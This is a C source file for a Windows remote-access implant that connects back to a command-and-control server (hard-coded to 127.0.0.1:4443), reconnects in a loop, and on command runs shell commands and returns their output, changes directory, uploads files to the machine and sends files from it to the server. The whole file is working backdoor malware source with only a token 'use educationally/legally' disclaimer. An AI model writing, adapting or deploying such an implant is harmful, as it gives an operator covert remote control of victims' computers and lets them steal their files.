 /* 
Coded by Mulvun
Use educationally/legally.;)
*/
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "sakito_tools.h"

#pragma comment(lib, "Ws2_32.lib")

// Function to create connect socket.
const SOCKET create_socket() {
	// Initialize winsock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	if (WSAStartup(ver, &wsData) != 0)
		return INVALID_SOCKET;

	// Create socket and hint structure
	const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (connect_socket == INVALID_SOCKET) {
		WSACleanup();
		return connect_socket;
	}

	return connect_socket;
}

// Function to connect the connect socket to c2 server.
int c2_connect(const SOCKET connect_socket, const char* host, const int port) {
	struct sockaddr_in hint;
	hint.sin_family = AF_INET;

	hint.sin_port = htons(port);
	inet_pton(AF_INET, host, &hint.sin_addr);

	// Connect to server hosting c2 service
	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		closesocket(connect_socket);
		return SOCKET_ERROR;
	}

	return 1;
}

// Function to receive file from client (TCP file transfer).
int recv_file(char* const buf, const char* filename, const SOCKET connect_socket) {
	FILE* fd = fopen(filename, "wb");

	// Receive file size.
	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	// Serialize f_size.
	uint32_t f_size = ntohl_conv(&*(buf));

	// Receive all file bytes/chunks and write to parsed filename.
	int iResult = 1;
	long int total = 0;

	while (total != f_size && iResult > 0) {
		iResult = recv(connect_socket, buf, BUFLEN, 0);
		fwrite(buf, 1, iResult, fd);
		total += iResult;
	}

	fclose(fd);

	return iResult;
}

// Function for sending file to client (TCP file transfer).
int send_file(const char* filename, const SOCKET connect_socket, char* const buf) {
	// Open file.
	FILE* fd = fopen(filename, "rb");

	uint32_t bytes = 0;
	uint32_t f_size = 0;

	if (fd) {
		// Calculate file size.
		fseek(fd, 0L, SEEK_END);
		f_size = ftell(fd);

		// Serialize f_size.
		bytes = htonl(f_size);
		fseek(fd, 0L, SEEK_SET);
	}

	if (send(connect_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
		return SOCKET_ERROR;

	int iResult = 1;

	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
	if (f_size) {
		int bytes_read;
		while (!feof(fd) && iResult > 0) {
			// Recursively read file until end of file (EOF).
			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
				// Send read bytes chunk to c2 server.
				iResult = send(connect_socket, buf, bytes_read, 0);
			}
			else {
				break;
			}
		}
		// Close the file.
		fclose(fd);
	}

	return iResult;
}

// Function to execute command.
int exec_cmd(const SOCKET connect_socket, char* const buf) {
	// Call Popen to execute command(s) and read the process' output.
	strcat(buf, " 2>&1");

	FILE* fpipe = _popen(buf, "r");
	int bytes_read;

	if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0) {
		bytes_read = 1;
		buf[0] = '\0';
	}

	uint32_t s_size = bytes_read;

	const int chunk = 24576;
	int capacity = chunk;

	char* output = malloc(capacity);
	strcpy(output, buf);

	// Read and store pipe's stdout in output.
	while (1) {
		if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0)
			break;
		// If output has reached maximum capacity in memory size.
		if ((s_size += bytes_read) == capacity)
			output = realloc(output, (capacity += chunk));

		strcat(output, buf);
	}

	// Serialize s_size.
	uint32_t bytes = htonl(s_size);

	// Send serialized bytes.
	if (send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	int iResult = send(connect_socket, output, s_size, 0);
	free(output);

	// Close the pipe stream.
	_pclose(fpipe);

	return iResult;
}

// Main function for connecting to c2 server & parsing c2 commands.
int main(void) {
	// immutable host and port.
	const char host[] = "127.0.0.1";
	const int port = 4443;

	while (1) {
		// Create the connect socket.
		const SOCKET connect_socket = create_socket();

		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
			  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
		if (connect_socket != INVALID_SOCKET) {
			int iResult = c2_connect(connect_socket, host, port);
			while (iResult > 0) {
				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
				char buf[BUFLEN + 5] = { 0 };

				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
					break;

				// buf[0] is the command code and &buf[1] is the parsed data.
				switch (buf[0]) {
					case '0':
						iResult = exec_cmd(connect_socket, &buf[1]);
						break;
					case '1':
						// Change directory.
						_chdir(&buf[1]);
						break;
					case '2':
						// Exit.
						return 0;
					case '3':
						// Upload file to client system.
						iResult = recv_file(buf, &buf[1], connect_socket);
						break;
					case '4':
						// Download file from client system.
						iResult = send_file(&buf[1], connect_socket, buf);
						break;
				}
			}
		}
		// If unable to connect or an error occurs sleep 8 seconds.
		Sleep(8000);
	}

	return -1;
}
// Enjoy!